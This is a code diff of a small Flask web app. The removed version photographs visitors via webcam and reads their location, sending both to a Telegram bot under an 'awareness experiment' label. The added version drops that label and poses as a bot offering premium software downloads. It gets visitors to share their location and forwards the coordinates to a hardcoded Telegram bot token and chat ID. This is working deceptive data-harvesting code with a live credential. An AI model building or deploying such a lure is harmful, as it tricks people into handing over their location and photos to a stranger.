@@ -1,99 +1,44 @@
-import base64
-import requests
 from flask import Flask, request, render_template_string
+import requests
+import os
 
 app = Flask(__name__)
 
-# Telegram Bot Config
-BOT_TOKEN = "7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4"
+# التوكن حق البوت
+TOKEN = "7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4"
+
+# الآيدي حقك
 CHAT_ID = "6969597735"
 
-HTML_PAGE = """
+html_page = """
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>تجربة الكاميرا والموقع</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    video, canvas {
-      margin: 10px;
-      border: 1px solid #ccc;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-    }
-    #status {
-      margin-top: 20px;
-      color: green;
-      font-weight: bold;
-    }
-  </style>
+  <title>Camera and Location</title>
 </head>
 <body>
-  <h2>تجربة الكاميرا والموقع</h2>
-  <p>هذه تجربة تعليمية توعوية تُظهر خطورة منح الصلاحيات للمواقع غير الموثوقة.</p>
-  <video id="video" width="320" height="240" autoplay></video><br/>
-  <button id="snap">التقاط صورة وإرسال البيانات</button>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-  <p id="status"></p>
+  <h2>أهلًا بكم في بوت المتمرد اليمني لتحميل البرامج الفخمة يا فخمين ✅♻️</h2>
+  <p>لتواصل مع المتمرد (@mtmrad0)</p>
+  <p>لمعرفة البرامج المتاحة اضغط على زر إرسال الموقع</p>
+  <button onclick="sendLocation()">📍 إرسال الموقع</button>
 
   <script>
-    let latitude = null;
-    let longitude = null;
-    let imageData = null;
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        document.getElementById("video").srcObject = stream;
-      })
-      .catch(err => {
-        document.getElementById("status").innerText = "لم يتم السماح بالكاميرا.";
-      });
-
-    navigator.geolocation.getCurrentPosition(
-      position => {
-        latitude = position.coords.latitude;
-        longitude = position.coords.longitude;
-        console.log("Latitude:", latitude, "Longitude:", longitude);
-      },
-      error => {
-        console.log("خطأ في جلب الموقع:", error);
-      }
-    );
-
-    document.getElementById("snap").addEventListener("click", () => {
-      const canvas = document.getElementById("canvas");
-      const video = document.getElementById("video");
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      imageData = canvas.toDataURL("image/png");
-      sendData();
-    });
-
-    function sendData() {
-      fetch("/upload", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          image: imageData,
-          latitude: latitude,
-          longitude: longitude
-        })
-      })
-      .then(response => response.text())
-      .then(data => {
-        document.getElementById("status").innerText = "✅ تم إرسال البيانات بنجاح!";
-      })
-      .catch(err => {
-        document.getElementById("status").innerText = "حدث خطأ في الإرسال.";
+    function sendLocation() {
+      navigator.geolocation.getCurrentPosition(pos => {
+        fetch("/send_location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude
+          })
+        }).then(response => {
+            alert("تم إرسال الموقع بنجاح!");
+        });
+      }, err => {
+        alert("فشل الحصول على الموقع: " + err.message);
       });
     }
   </script>
@@ -101,47 +46,33 @@ HTML_PAGE = """
 </html>
 """
 
-@app.route("/", methods=["GET"])
-def index():
-    return render_template_string(HTML_PAGE)
+@app.route('/')
+def home():
+    return render_template_string(html_page)
 
-@app.route("/upload", methods=["POST"])
-def upload():
-    data = request.json
+@app.route('/send_location', methods=["POST"])
+def send_location():
+    data = request.get_json()
+    lat = data.get("lat")
+    lon = data.get("lon")
 
-    # استخراج الصورة من البيانات base64
-    image_data = data["image"].split(",")[1]
-    filename = "captured_image.png"
-    with open(filename, "wb") as f:
-        f.write(base64.b64decode(image_data))
+    # نص الرسالة اللي ترسلها للبوت
+    text = f"📍 تم التقاط الموقع:\nLatitude: {lat}\nLongitude: {lon}"
+    send_message(text)
 
-    # إرسال الصورة إلى تليجرام
-    send_photo_to_telegram(filename)
+    return "OK"
 
-    # إرسال الموقع إلى تليجرام
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-
-    if latitude and longitude:
-        text = f"📍 موقع المستخدم:\nLatitude: {latitude}\nLongitude: {longitude}\nGoogle Maps: https://www.google.com/maps?q={latitude},{longitude}"
-        send_message_to_telegram(text)
-
-    return "تم استلام البيانات"
-
-def send_photo_to_telegram(filepath):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    with open(filepath, "rb") as photo:
-        files = {"photo": photo}
-        data = {
-            "chat_id": CHAT_ID,
-            "caption": "📸 صورة ملتقطة من المستخدم (تجربة توعوية)"
-        }
-        requests.post(url, files=files, data=data)
-
-def send_message_to_telegram(text):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": text}
-    requests.post(url, data=data)
+def send_message(text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": text
+    }
+    try:
+        requests.post(url, data=payload, timeout=5)
+    except Exception as e:
+        print(f"Error sending message: {e}")
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
